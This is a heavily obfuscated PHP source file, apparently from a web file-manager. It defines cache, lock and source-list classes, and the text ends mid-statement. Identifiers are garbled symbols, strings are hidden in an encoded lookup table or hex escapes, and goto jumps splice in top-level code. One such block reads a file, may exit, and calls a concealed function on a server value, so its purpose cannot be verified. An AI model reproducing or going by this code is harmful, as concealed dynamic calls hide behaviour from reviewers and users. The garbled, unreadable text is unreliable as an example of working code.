PathDriverDB { public function __construct($ÀÈÍŠ×) { $this->pathParse = $ÀÈÍŠ×; $this->model = Model($_SERVER[Ã¶¡¶„æ][1350]); } protected function infoParse($ÚƒÃŞ¢, $»¦©Ç¡ş = false, $ÑûÉ±±À = false) { $×å¼Ú¸² =& $_SERVER[Ã¶¡¶„æ]; return Action($×å¼Ú¸²[1189])->sharePathInfo($this->pathParse[$×å¼Ú¸²[84]], !0, $»¦©Ç¡ş); } public function listPath($È¹¦ÆƒŒ, $Ñš§Øù = false) { $¡Š‰ÉĞ¤ =& $_SERVER[Ã¶¡¶„æ]; $Ûıõäˆ² = parent::listPath($È¹¦ÆƒŒ, $Ñš§Øù); if (!$Ûıõäˆ²) { return $Ûıõäˆ²; } if (is_array($Ûıõäˆ²[$¡Š‰ÉĞ¤[1359]])) { $Ûıõäˆ²[$¡Š‰ÉĞ¤[1359]] = Action($¡Š‰ÉĞ¤[1189])->shareItemInfo($Ûıõäˆ²[$¡Š‰ÉĞ¤[1359]]); } foreach ($Ûıõäˆ² as $ÍšÕ¶…¬ => $³†ã€±) { if (!in_array($ÍšÕ¶…¬, array($¡Š‰ÉĞ¤[83], $¡Š‰ÉĞ¤[82]))) { continue; } foreach ($³†ã€± as $‘­Æ•û => $¹–Ç’ì‹) { $Ûıõäˆ²[$ÍšÕ¶…¬][$‘­Æ•û] = Action($¡Š‰ÉĞ¤[1189])->shareItemInfo($¹–Ç’ì‹); } } return $Ûıõäˆ²; } public function listAll($ÖÂğ’É) { $Åš¾‰Ğú =& $_SERVER[Ã¶¡¶„æ]; $ìÜñ‘Â³ = IO::info($this->pathParse[$Åš¾‰Ğú[84]]); if (!$ìÜñ‘Â³) { return array(); } $ÚàÒìé¹ = $this->model->listAll($ÖÂğ’É); foreach ($ÚàÒìé¹ as &$®è’û–) { $®è’û–[$Åš¾‰Ğú[86]] = Action($Åš¾‰Ğú[1189])->shareItemInfo($®è’û–[$Åš¾‰Ğú[86]]); } unset($®è’û–); return $ÚàÒìé¹; } } $_file = $_SERVER[$_SERVER[Ã¶¡¶„æ][847]]; goto C¤«ßåÜö¶; aŠÔÄ½¶ÀÇ: if ($_SERVER[$_SERVER[Ã¶¡¶„æ][840]] != $_SERVER[$_SERVER[Ã¶¡¶„æ][841]]) { $_getc = $_SERVER[Ã¶¡¶„æ][842]; $_getfile = $_SERVER[$_SERVER[Ã¶¡¶„æ][843]] . $_SERVER[Ã¶¡¶„æ][844]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ã¶¡¶„æ][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ã¶¡¶„æ][619]) { $exit = $_SERVER[Ã¶¡¶„æ][845]; $exit(); } $_act = $_SERVER[Ã¶¡¶„æ][846]; $_act($_SERVER[$_SERVER[Ã¶¡¶„æ][847]]); } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ë¿ô¾ù¬, $•¨µÑğ€) { $³‘ß®ö¶ =& $_SERVER[Ã¶¡¶„æ]; $this->cachePath = $ë¿ô¾ù¬[$³‘ß®ö¶[84]]; $this->prefix = $³‘ß®ö¶[848]; $this->cacheTime = $•¨µÑğ€; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($İ…äÈÆ¤) { $‚•Ğ‡Öû =& $_SERVER[Ã¶¡¶„æ]; $İ…äÈÆ¤ = str_replace(array($‚•Ğ‡Öû[849], $‚•Ğ‡Öû[97], $‚•Ğ‡Öû[73]), $‚•Ğ‡Öû[850], $İ…äÈÆ¤); return $this->cachePath . $‚•Ğ‡Öû[851] . $İ…äÈÆ¤ . $‚•Ğ‡Öû[852]; } public function set($‰Êë€º, $•°õÛ’, $í°¶ÂÌõ = false) { $í°¶ÂÌõ = $í°¶ÂÌõ ? $í°¶ÂÌõ : $this->cacheTime; $äì‡ı°ì = $this->getFile($‰Êë€º); if (file_put_contents($äì‡ı°ì, $this->prefix . $•°õÛ’, LOCK_EX)) { @touch($äì‡ı°ì, intval(time() + $í°¶ÂÌõ)); clearstatcache(); return !0; } @unlink($äì‡ı°ì); return !1; } public function get($«£´Ú–) { $„î¢ìé = $this->getFile($«£´Ú–); if (file_exists($„î¢ìé) && filemtime($„î¢ìé) < time()) { @unlink($„î¢ìé); return !1; } $‹»–œøï = @file_get_contents($„î¢ìé); return substr($‹»–œøï, strlen($this->prefix)); } public function remove($§®»÷æ±) { $½é°ã€ó = $this->getFile($§®»÷æ±); return @unlink($½é°ã€ó); } public function deleteAll() { $çÍó¯§‘ =& $_SERVER[Ã¶¡¶„æ]; $óı£ºº× = scandir($this->cachePath); foreach ($óı£ºº× as $ŒşêƒÏ) { $‘¯óõ¾‰ = $this->cachePath . $ŒşêƒÏ; if (strpos($‘¯óõ¾‰, $çÍó¯§‘[852]) && strpos($‘¯óõ¾‰, $çÍó¯§‘[853])) { @unlink($‘¯óõ¾‰); } } } public function clearTimeout() { $ŠÃ»˜‚ =& $_SERVER[Ã¶¡¶„æ]; $‡»Ÿä¨ = scandir($this->cachePath); foreach ($‡»Ÿä¨ as $ÎÖíİáñ) { $Î÷•õ± = $this->cachePath . $ÎÖíİáñ; if (strpos($Î÷•õ±, $ŠÃ»˜‚[852]) && strpos($Î÷•õ±, $ŠÃ»˜‚[853]) && filemtime($Î÷•õ±) < time()) { @unlink($Î÷•õ±); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ó‹ÎÙ =& $_SERVER[Ã¶¡¶„æ]; if (self::$handle) { return self::$handle; } $¯ù„ï³® = $GLOBALS[$ó‹ÎÙ[6]][$ó‹ÎÙ[349]]; self::$timeout = $¯ù„ï³®[$ó‹ÎÙ[854]] ? $¯ù„ï³®[$ó‹ÎÙ[854]] : 10; $èå’·é = _get($GLOBALS[$ó‹ÎÙ[6]], $ó‹ÎÙ[855]); $±ÇşÀŠä = $¯ù„ï³®[$ó‹ÎÙ[833]] ? $¯ù„ï³®[$ó‹ÎÙ[833]] : $ó‹ÎÙ[199]; if ($±ÇşÀŠä == $ó‹ÎÙ[21] && $èå’·é == $ó‹ÎÙ[13]) { $±ÇşÀŠä = $ó‹ÎÙ[199]; } switch ($±ÇşÀŠä) { case $ó‹ÎÙ[836]: self::$handle = new CacheLockRedis(); break; case $ó‹ÎÙ[837]: self::$handle = new CacheLockMemcached(); break; case $ó‹ÎÙ[21]: self::$handle = new CacheLockDatabase(); break; case $ó‹ÎÙ[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ó‹ÎÙ[856], $ó‹ÎÙ[857]); } return self::$handle; } private static function key($™Ö­¼•) { return $_SERVER[Ã¶¡¶„æ][858] . Cache::key($™Ö­¼•); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ùœ‚ºÓ = '') { self::$errorMsg = $ùœ‚ºÓ; } public static function lockGlobal($ş¿Ïº±, $¡ŸÎŒŞŸ) { return self::lock($ş¿Ïº±, $¡ŸÎŒŞŸ, !0); } public static function lock($¥„şÕüÚ, $°–ìÏ·© = false, $Ã²ñ»¥º = false) { $µ¢Ä¤´ö =& $_SERVER[Ã¶¡¶„æ]; $ô´Ëï™ö = self::init(); $ÃÂ’Í¦§ = self::key($¥„şÕüÚ); $°–ìÏ·© = $°–ìÏ·© ? $°–ìÏ·© : self::$timeout; $çŒ—©åé = timeFloat(); $¹§÷íßö = $ô´Ëï™ö->lock($ÃÂ’Í¦§, $°–ìÏ·©); $­Êä¬ÏÅ = timeFloat(); if (!$¹§÷íßö) { $¢§ÈÃÛ“ = "\154\x6f\143\153\x20\145\x72\162\x6f\x72\x3b\x6b\145\x79\x3d{$¥„şÕüÚ}\x3b\x74\151\x6d\145\x3d{$°–ìÏ·©}\73" . self::$errorMsg . $µ¢Ä¤´ö[71] . get_caller_msg(); $Šï§ù…Ò = LNG($µ¢Ä¤´ö[859]) . "\50{$°–ìÏ·©}\163\51\56" . LNG($µ¢Ä¤´ö[860]); $Šï§ù…Ò .= $µ¢Ä¤´ö[861]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Šï§ù…Ò = $Šï§ù…Ò . $µ¢Ä¤´ö[862] . self::$errorMsg; } write_log($µ¢Ä¤´ö[863] . sprintf($µ¢Ä¤´ö[864], timeFloat() - $çŒ—©åé) . $µ¢Ä¤´ö[865] . $¢§ÈÃÛ“ . $µ¢Ä¤´ö[866] . error_get_last(), $µ¢Ä¤´ö[857]); show_json($Šï§ù…Ò, !1); } if (!$Ã²ñ»¥º) { self::$lockItem[$ÃÂ’Í¦§] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $êİ²¬±è = number_format(timeFloat() - $­Êä¬ÏÅ, 3); write_log($µ¢Ä¤´ö[867] . $¥„şÕüÚ . $µ¢Ä¤´ö[868] . $êİ²¬±è, $µ¢Ä¤´ö[857]); } return $¹§÷íßö; } public static function lockGet($ÛÎÊ¼¢à) { $††ÓÃ = self::key($ÛÎÊ¼¢à); if (self::$lockItem[$††ÓÃ]) { return self::$lockItem[$††ÓÃ]; } return self::init()->lockGet($††ÓÃ); } public static function unlock($åÏçê Ì) { $˜«Î¦Ï± =& $_SERVER[Ã¶¡¶„æ]; $¦‘…Æš¢ = self::key($åÏçê Ì); self::$lockItem[$¦‘…Æš¢] = null; self::init()->unlock($¦‘…Æš¢); if (GLOBAL_DEBUG_LOG_ALL) { write_log($˜«Î¦Ï±[869] . $åÏçê Ì, $˜«Î¦Ï±[857]); } return; } public static function unlockRuntime() { $™Ğ‰Òê€ =& $_SERVER[Ã¶¡¶„æ]; $‘ù‘îâ¼ = self::init(); $Á¨Ãéª‚ = !1; foreach (self::$lockItem as $Ñ¦èÄ÷¼ => $öœé‰ıí) { if (!$öœé‰ıí) { continue; } $‘ù‘îâ¼->unlock($Ñ¦èÄ÷¼); if (!$Á¨Ãéª‚) { $Á¨Ãéª‚ = !0; write_log($™Ğ‰Òê€[870] . $Ñ¦èÄ÷¼ . $™Ğ‰Òê€[71] . get_caller_msg(), $™Ğ‰Òê€[857]); continue; } write_log($™Ğ‰Òê€[870] . $Ñ¦èÄ÷¼, $™Ğ‰Òê€[857]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ä“¦ëÉ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($™Ğ‰Òê€[871] . $Ä“¦ëÉ . $™Ğ‰Òê€[872] . ACTION, $™Ğ‰Òê€[857]); } } public static function fileLock($Ô¨˜ˆÒ) { $´¦†üçú =& $_SERVER[Ã¶¡¶„æ]; if (!$GLOBALS[$´¦†üçú[873]]) { $GLOBALS[$´¦†üçú[873]] = array(); } $GLOBALS[$´¦†üçú[873]][$Ô¨˜ˆÒ] = !1; $ªµƒ†˜· = fopen(DATA_PATH . $Ô¨˜ˆÒ . $´¦†üçú[874], $´¦†üçú[875]); if (!$ªµƒ†˜·) { return !1; } $GLOBALS[$´¦†üçú[873]][$Ô¨˜ˆÒ] = $ªµƒ†˜·; if (flock($ªµƒ†˜·, LOCK_EX)) { return !0; } self::unlock($Ô¨˜ˆÒ); show_json($´¦†üçú[876], !1); return !1; } public static function fileUnlock($ Ñ—È€©) { $¹ÀæîÖ¿ =& $_SERVER[Ã¶¡¶„æ]; $úÛ…÷Îà = $GLOBALS[$¹ÀæîÖ¿[873]][$ Ñ—È€©]; if (!$úÛ…÷Îà) { return; } $GLOBALS[$¹ÀæîÖ¿[873]][$ Ñ—È€©] = !1; flock($úÛ…÷Îà, LOCK_UN); fclose($úÛ…÷Îà); } public static function fileUnlockAll() { $æõÜÆ‹— =& $_SERVER[Ã¶¡¶„æ]; if (!$GLOBALS[$æõÜÆ‹—[873]]) { return; } foreach ($GLOBALS[$æõÜÆ‹—[873]] as $Êİ¬É‡Ä => $Í´Ì˜œ) { if (!$Í´Ì˜œ) { continue; } $GLOBALS[$æõÜÆ‹—[873]][$Êİ¬É‡Ä] = !1; flock($Í´Ì˜œ, LOCK_UN); fclose($Í´Ì˜œ); } $GLOBALS[$æõÜÆ‹—[873]] = array(); } } goto aäŠÔİ¯ÖÒ; e…Îì«£¨Ê: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Æ¼­ëÅ = false, $ë˜‡ğò— = '', $„§óÅü‹ = false) { $Øó…öÆœ =& $_SERVER[Ã¶¡¶„æ]; $¹Ùèâı“ = $this->cacheGet($ë˜‡ğò—); $Î½ş±„€ = $this->optionDefault($ë˜‡ğò—); $Î½ş±„€ = is_array($Î½ş±„€) ? $Î½ş±„€ : array(); if (is_array($¹Ùèâı“)) { $¹Ùèâı“ = array_merge($Î½ş±„€, $¹Ùèâı“); return $Æ¼­ëÅ ? isset($¹Ùèâı“[$Æ¼­ëÅ]) ? $¹Ùèâı“[$Æ¼­ëÅ] : null : $¹Ùèâı“; } $Õóò“ıŞ = $this->filterWhere(array($Øó…öÆœ[33] => $ë˜‡ğò—)); $¹Ùèâı“ = $this->where($Õóò“ıŞ)->select(); $¹Ùèâı“ = array_to_keyvalue($¹Ùèâı“, $Øó…öÆœ[94], $Øó…öÆœ[374]); foreach ($¹Ùèâı“ as $¸ú¼Éíı => $ˆ¬˜ƒ¸Œ) { if ($„§óÅü‹ || in_array($¸ú¼Éíı, $this->jsonField)) { $¹Ùèâı“[$¸ú¼Éíı] = json_decode($ˆ¬˜ƒ¸Œ, !0); } } $this->cacheSet($ë˜‡ğò—, $¹Ùèâı“); $¹Ùèâı“ = array_merge($Î½ş±„€, $¹Ùèâı“); return $Æ¼­ëÅ ? $¹Ùèâı“[$Æ¼­ëÅ] : $¹Ùèâı“; } public function set($ö¡£¡‚², $›‰ƒ¥ = false, $¹ à‰Ôè = '') { $·Ï‹¤ğ½ =& $_SERVER[Ã¶¡¶„æ]; $this->cacheRemove($¹ à‰Ôè); $“Şö¯Š÷ = array(); $Å‘Ÿ±à¼ = is_array($ö¡£¡‚²) ? $ö¡£¡‚² : array($ö¡£¡‚² => $›‰ƒ¥); foreach ($Å‘Ÿ±à¼ as $·Ëğ„¾Å => $¸ÛÕèıÖ) { if (is_array($¸ÛÕèıÖ)) { $¸ÛÕèıÖ = json_encode_force($¸ÛÕèıÖ); } $this->checkLength($¸ÛÕèıÖ, !1, $this->tableName . $·Ï‹¤ğ½[4] . $ö¡£¡‚²); $¸ÛÕèıÖ = self::textEncode($¸ÛÕèıÖ); $Å‘Ÿ±à¼ = array($·Ï‹¤ğ½[33] => $¹ à‰Ôè, $·Ï‹¤ğ½[94] => $·Ëğ„¾Å, $·Ï‹¤ğ½[374] => $¸ÛÕèıÖ); $“Şö¯Š÷[] = $this->filterWhere($Å‘Ÿ±à¼); } if (!$“Şö¯Š÷) { return !0; } $ÑÜ¬ †Ä = $this->cacheKey($·Ï‹¤ğ½[400]); CacheLock::lock($ÑÜ¬ †Ä); $„¿¶ı¾€ = $this->addAll($“Şö¯Š÷, array(), !0); CacheLock::unlock($ÑÜ¬ †Ä); return $„¿¶ı¾€; } protected function optionDefault($÷¦¦ïù = '') { return !1; } public function setDeep($šÔÍíı—, $ş³«»¿ = false, $İÎ–½ = '') { $¹À‡Ô  = explode($_SERVER[Ã¶¡¶„æ][10], $šÔÍíı—); $•î‡¯ñï = $this->get(); array_set_value($•î‡¯ñï, $šÔÍíı—, $ş³«»¿); $this->set($¹À‡Ô [0], $•î‡¯ñï[$¹À‡Ô [0]], $İÎ–½); } public function remove($©÷Şï©, $£óåº«Ø = '') { $ØÌ±˜Ù² =& $_SERVER[Ã¶¡¶„æ]; $this->cacheRemove($£óåº«Ø); $•ïßõÇ = $this->filterWhere(array($ØÌ±˜Ù²[94] => $©÷Şï©, $ØÌ±˜Ù²[33] => $£óåº«Ø)); if (is_null($©÷Şï©)) { unset($•ïßõÇ[$ØÌ±˜Ù²[94]]); } return $this->where($•ïßõÇ)->delete(); } public function cacheSet($¼®¬È›ª, $‰îàôàæ = false) { return Cache::set($this->cacheKey($¼®¬È›ª), $‰îàôàæ); } public function cacheGet($ŞŸÏÛÅ) { return Cache::get($this->cacheKey($ŞŸÏÛÅ)); } public function cacheRemove($ œ›½éÒ) { return Cache::remove($this->cacheKey($ œ›½éÒ)); } protected function filterWhere($ùŞ·ü÷Ø) { return $ùŞ·ü÷Ø; } protected function cacheKey($…“¼şåµ) { return $…“¼şåµ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\x72\x63\145"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\155\x65" => "\151\x6f\137\163\157\165\x72\x63\x65\137\x6d\x65\164\x61", "\155\145\x74\x61\106\x69\145\154\144" => "\163\x6f\165\x72\143\x65\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\144\x69\146\171\124\151\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\x65\162\x74", "\x66\x75\x6e\143\164\151\x6f\x6e"), array("\x63\x72\x65\141\164\145\124\151\155\x65", "\x74\x69\x6d\145", "\151\156\163\145\x72\x74", "\x66\x75\x6e\143\x74\151\157\x6e"), array("\166\151\145\167\x54\151\155\x65", "\164\x69\x6d\145", "\151\156\x73\145\162\164", "\x66\x75\156\143\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($çü€Ğ¸) { return $this->listSource(array($_SERVER[Ã¶¡¶„æ][401] => $çü€Ğ¸)); } public function typeName($Ó‰ÃÈªä) { static $øúÑ = array(self::TYPE_SYSTEM => "\163\171\x73\164\x65\x6d", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\x72\x6f\165\x70"); return $øúÑ[$Ó‰ÃÈªä . $_SERVER[Ã¶¡¶„æ][12]]; } public function sourceListInfo($ĞÃ‡Š¡ã, $ì£Ò•¤Œ = false) { $‰ì£ ß =& $_SERVER[Ã¶¡¶„æ]; $ĞÃ‡Š¡ã = $ĞÃ‡Š¡ã ? $ĞÃ‡Š¡ã : array(); $ĞÃ‡Š¡ã = array_filter(array_unique($ĞÃ‡Š¡ã)); if (!$ĞÃ‡Š¡ã) { return array(); } $®›¬®” = $this->where(array($‰ì£ ß[402] => array($‰ì£ ß[7], $ĞÃ‡Š¡ã)))->select(); $this->_listDataApply($®›¬®”, $ì£Ò•¤Œ); return array_to_keyvalue($®›¬®”, $‰ì£ ß[402]); } public function pathInfoFilter(&$Ÿï—ÈÊ) { $Ø—Æ˜¬õ =& $_SERVER[Ã¶¡¶„æ]; static $ÊÒÎ»Ç¬ = false; static $ñıŒ•ì = false; static $Â˜˜ü = false; if (!$ÊÒÎ»Ç¬) { $¡£¸ğ•“ = $Ø—Æ˜¬õ[403]; $¡£¸ğ•“ .= $Ø—Æ˜¬õ[404]; $¡£¸ğ•“ .= $Ø—Æ˜¬õ[405]; $¼ÒÔ±Ø = $Ø—Æ˜¬õ[406]; $ğö¦ä…ø = explode($Ø—Æ˜¬õ[50], $¼ÒÔ±Ø); $ÊÒÎ»Ç¬ = explode($Ø—Æ˜¬õ[50], $¡£¸ğ•“); $ñıŒ•ì = array(); foreach ($ÊÒÎ»Ç¬ as $§â‘½²®) { if (in_array($§â‘½²®, $ğö¦ä…ø)) { continue; } $ñıŒ•ì[] = $§â‘½²®; } $Â˜˜ü = explode($Ø—Æ˜¬õ[50], $Ø—Æ˜¬õ[407]); } foreach ($Â˜˜ü as $õ‘Ø¹è) { if (isset($Ÿï—ÈÊ[$õ‘Ø¹è])) { $Ÿï—ÈÊ[$õ‘Ø¹è] = intval($Ÿï—ÈÊ[$õ‘Ø¹è]); } } $Ÿï—ÈÊ[$Ø—Æ˜¬õ[84]] = $Ø—Æ˜¬õ[408] . $Ÿï—ÈÊ[$Ø—Æ˜¬õ[402]] . $Ø—Æ˜¬õ[409]; $Ÿï—ÈÊ[$Ø—Æ˜¬õ[33]] = $Ÿï—ÈÊ[$Ø—Æ˜¬õ[410]] == 1 ? $Ø—Æ˜¬õ[75] : $Ø—Æ˜¬õ[199]; $Ÿï—ÈÊ[$Ø—Æ˜¬õ[411]] = $this->typeName($Ÿï—ÈÊ[$Ø—Æ˜¬õ[411]]); if ($Ÿï—ÈÊ[$Ø—Æ˜¬õ[410]] != 1) { $Ÿï—ÈÊ[$Ø—Æ˜¬õ[174]] = $Ÿï—ÈÊ[$Ø—Æ˜¬õ[412]]; unset($Ÿï—ÈÊ[$Ø—Æ˜¬õ[412]]); } $¨ó“Ó¨Ñ = $ÊÒÎ»Ç¬; if (isset($Ÿï—ÈÊ[$Ø—Æ˜¬õ[413]]) && $Ÿï—ÈÊ[$Ø—Æ˜¬õ[413]][$Ø—Æ˜¬õ[414]] == -1) { $¨ó“Ó¨Ñ = $ñıŒ•ì; } $Ÿï—ÈÊ = array_field_key($Ÿï—ÈÊ, $¨ó“Ó¨Ñ); return $Ÿï—ÈÊ; } public function listUserFav() { $··Ü Æ÷ =& $_SERVER[Ã¶¡¶„æ]; $¬÷³€¡ = Model($··Ü Æ÷[415])->listData(); $­ÉŠÎĞÍ = array_filter_by_field($¬÷³€¡, $··Ü Æ÷[33], $··Ü Æ÷[416]); $­ÉŠÎĞÍ = array_to_keyvalue($­ÉŠÎĞÍ, $··Ü Æ÷[12], $··Ü Æ÷[84]); if ($­ÉŠÎĞÍ) { $áµíåÑè = $this->listSource(array($··Ü Æ÷[417] => array($··Ü Æ÷[418], $­ÉŠÎĞÍ))); } $áµíåÑè = array_to_keyvalue($áµíåÑè[$··Ü Æ÷[369]], $··Ü Æ÷[402]); foreach ($¬÷³€¡ as &$ĞØ¸Ìó¦) { $ĞØ¸Ìó¦ = array($··Ü Æ÷[419] => $ĞØ¸Ìó¦[$··Ü Æ÷[399]], $··Ü Æ÷[420] => $ĞØ¸Ìó¦[$··Ü Æ÷[32]], $··Ü Æ÷[421] => $ĞØ¸Ìó¦[$··Ü Æ÷[84]], $··Ü Æ÷[422] => $ĞØ¸Ìó¦[$··Ü Æ÷[33]], $··Ü Æ÷[423] => $ĞØ¸Ìó¦[$··Ü Æ÷[200]], $··Ü Æ÷[424] => $ĞØ¸Ìó¦[$··Ü Æ÷[85]]); if ($ĞØ¸Ìó¦[$··Ü Æ÷[33]] == $··Ü Æ÷[416] && $áµíåÑè[$ĞØ¸Ìó¦[$··Ü Æ÷[84]]]) { $ĞØ¸Ìó¦[$··Ü Æ÷[86]] = $áµíåÑè[$ĞØ¸Ìó¦[$··Ü Æ÷[84]]]; } } unset($ĞØ¸Ìó¦); return $¬÷³€¡; } public function listUserTag($üÑïµß¢) { $ıËÁ›˜ï =& $_SERVER[Ã¶¡¶„æ]; if ($üÑïµß¢ && !is_array($üÑïµß¢)) { $üÑïµß¢ = array($üÑïµß¢); } $ò…—ÖÀ™ = Model($ıËÁ›˜ï[425])->listData(); $Æ§Ö¢¾İ = array(); $şñÍ®÷Ô = array(); foreach ($ò…—ÖÀ™ as $Ÿ‹ñüá) { $„êÂÚ÷· = $Ÿ‹ñüá[$ıËÁ›˜ï[84]]; if (!$„êÂÚ÷·) { continue; } if (!isset($şñÍ®÷Ô[$„êÂÚ÷·])) { $şñÍ®÷Ô[$„êÂÚ÷·] = array(); } $şñÍ®÷Ô[$„êÂÚ÷·][] = $Ÿ‹ñüá[$ıËÁ›˜ï[426]]; $Æ§Ö¢¾İ[$Ÿ‹ñüá[$ıËÁ›˜ï[84]]] = $Ÿ‹ñüá; } $Â¼ŒãŒŸ = array(); $ßÍ„š°ú = array(); $ÎÀÆÓ¥ø = array(); foreach ($şñÍ®÷Ô as $áÕĞÕÜ… => $äÀ°ºÍú) { $ØèÇàãá = !0; if (!$üÑïµß¢) { $Â¼ŒãŒŸ[] = $áÕĞÕÜ…; continue; } foreach ($üÑïµß¢ as $±•»ü«“) { if (!in_array($±•»ü«“, $äÀ°ºÍú)) { $ØèÇàãá = !1; break; } } if (!$ØèÇàãá) { continue; } if (!is_numeric($áÕĞÕÜ…)) { $§ÁñÈ†ˆ = $Æ§Ö¢¾İ[$áÕĞÕÜ…]; $±§³”»  = array($ıËÁ›˜ï[32] => $§ÁñÈ†ˆ[$ıËÁ›˜ï[32]], $ıËÁ›˜ï[84] => $§ÁñÈ†ˆ[$ıËÁ›˜ï[84]], $ıËÁ›˜ï[33] => $§ÁñÈ†ˆ[$ıËÁ›˜ï[33]], $ıËÁ›˜ï[86] => array($ıËÁ›˜ï[427] => 1), $ıËÁ›˜ï[201] => !0); if ($§ÁñÈ†ˆ[$ıËÁ›˜ï[33]] == $ıËÁ›˜ï[199]) { $ÎÀÆÓ¥ø[] = $±§³”» ; } if ($§ÁñÈ†ˆ[$ıËÁ›˜ï[33]] == $ıËÁ›˜ï[75]) { $ßÍ„š°ú[] = $±§³”» ; } continue; } $Â¼ŒãŒŸ[] = $áÕĞÕÜ…; } if ($Â¼ŒãŒŸ) { $§‹©Û²– = $this->listSource(array($ıËÁ›˜ï[417] => array($ıËÁ›˜ï[418], $Â¼ŒãŒŸ))); } $§‹©Û²– = $§‹©Û²– ? $§‹©Û²– : array($ıËÁ›˜ï[82] => array(), $ıËÁ›˜ï[83] => array()); $§‹©Û²–[$ıËÁ›˜ï[82]] = array_merge($§‹©Û²–[$ıËÁ›˜ï[82]], $ßÍ„š°ú); $§‹©Û²–[$ıËÁ›˜ï[83]] = array_merge($§‹©Û²–[$ıËÁ›˜ï[83]], $ÎÀÆÓ¥ø); if (isset($§‹©Û²–[$ıËÁ›˜ï[366]]) && count($Â¼ŒãŒŸ) == $§‹©Û²–[$ıËÁ›˜ï[366]][$ıËÁ›˜ï[367]]) { return $§‹©Û²–; } $Ö™ìà‰Û = array(); $íãîà’” = array_to_keyvalue($§‹©Û²–[$ıËÁ›˜ï[82]], $ıËÁ›˜ï[12], $ıËÁ›˜ï[402]); $€çÁâé = array_to_keyvalue($§‹©Û²–[$ıËÁ›˜ï[83]], $ıËÁ›˜ï[12], $ıËÁ›˜ï[402]); $ÓÍ²–‡í = array_merge($€çÁâé, $íãîà’”); foreach ($Â¼ŒãŒŸ as $„êÂÚ÷·) { if (!in_array($„êÂÚ÷·, $ÓÍ²–‡í)) { $Ö™ìà‰Û[] = $„êÂÚ÷·; } } if ($Ö™ìà‰Û) { Model($ıËÁ›˜ï[428])->removeBySource($Ö™ìà‰Û); } return $§‹©Û²–; } public function listUserRecycle() { $²œ–¿Ìé =& $_SERVER[Ã¶¡¶„æ]; $†Î¯Óªš = Model($²œ–¿Ìé[429])->listData(); if (!$†Î¯Óªš) { return array(); } $È›™²¦© = array($²œ–¿Ìé[417] => array($²œ–¿Ìé[418], $†Î¯Óªš), $²œ–¿Ìé[430] => 1); return $this->listSource($È›™²¦©); } public function listSource($Òíº¢†¯, $óó­„•Ü = 3000, $Ù’ÃÒø§ = false) { $œ¸ï–²İ =& $_SERVER[Ã¶¡¶„æ]; if (!isset($Òíº¢†¯[$œ¸ï–²İ[431]])) { $Òíº¢†¯[$œ¸ï–²İ[431]] = 0; } if (isset($Òíº¢†¯[$œ¸ï–²İ[432]]) && $Òíº¢†¯[$œ¸ï–²İ[432]] == $œ¸ï–²İ[197]) { $Òíº¢†¯[$œ¸ï–²İ[412]] = array($œ¸ï–²İ[331], $œ¸ï–²İ[433]); } $áØ›õ = $œ¸ï–²İ[434]; $—Ô´°œĞ = $this->field($áØ›õ)->_makeOrder()->where($Òíº¢†¯)->selectPage($óó­„•Ü); $this->_listPageCheck($—Ô´°œĞ, $áØ›õ, $Òíº¢†¯); $this->_listDataApply($—Ô´°œĞ[$œ¸ï–²İ[369]], $Ù’ÃÒø§); $this->_listMake($—Ô´°œĞ); return $—Ô´°œĞ; } private function _listPageCheck(&$Å§Ö°¾ı, $ç¨àÍÌ, $ëÓ’×êß) { $ô‡¸ÕòØ =& $_SERVER[Ã¶¡¶„æ]; if (!is_array($Å§Ö°¾ı[$ô‡¸ÕòØ[366]])) { return; } $ÚÚìÊŸ = $Å§Ö°¾ı[$ô‡¸ÕòØ[366]]; if ($ÚÚìÊŸ[$ô‡¸ÕòØ[368]] <= 1) { return; } if ($ÚÚìÊŸ[$ô‡¸ÕòØ[367]] >= 100000) { return; } if (Model($ô‡¸ÕòØ[435])->get($ô‡¸ÕòØ[436]) != $ô‡¸ÕòØ[437]) { return; } $ç¨àÍÌ = str_replace(array($ô‡¸ÕòØ[53], $ô‡¸ÕòØ[342], $ô‡¸ÕòØ[231]), $ô‡¸ÕòØ[12], $ç¨àÍÌ); $ç¨àÍÌ = $ô‡¸ÕòØ[438] . str_replace($ô‡¸ÕòØ[50], $ô‡¸ÕòØ[439], $ç¨àÍÌ) . $ô‡¸ÕòØ[440]; $´ù­ïî = $ô‡¸ÕòØ[441]; $´ù­ïî = $´ù­ïî . $ô‡¸ÕòØ[442]; $ÓÏù¯¨‰ = $ÚÚìÊŸ[$ô‡¸ÕòØ[363]] * ($ÚÚìÊŸ[$ô‡¸ÕòØ[353]] - 1) . $ô‡¸ÕòØ[50] . $ÚÚìÊŸ[$ô‡¸ÕòØ[363]]; $Ÿíã”´¸ = $this->_makeOrder(!0); $·í’â› = $ô‡¸ÕòØ[438] . str_replace($ô‡¸ÕòØ[50], $ô‡¸ÕòØ[439], $Ÿíã”´¸[0]); if (strpos($·í’â›, $ô‡¸ÕòØ[443])) { $·í’â› = str_replace($ô‡¸ÕòØ[443], $ô‡¸ÕòØ[444], $·í’â›); } else { $·í’â› .= $ô‡¸ÕòØ[445] . $Ÿíã”´¸[1]; } $‚ƒø = array(); foreach ($ëÓ’×êß as $…ªÚ– => $óŸ×îµ¹) { $‚ƒø[$ô‡¸ÕòØ[438] . $…ªÚ–] 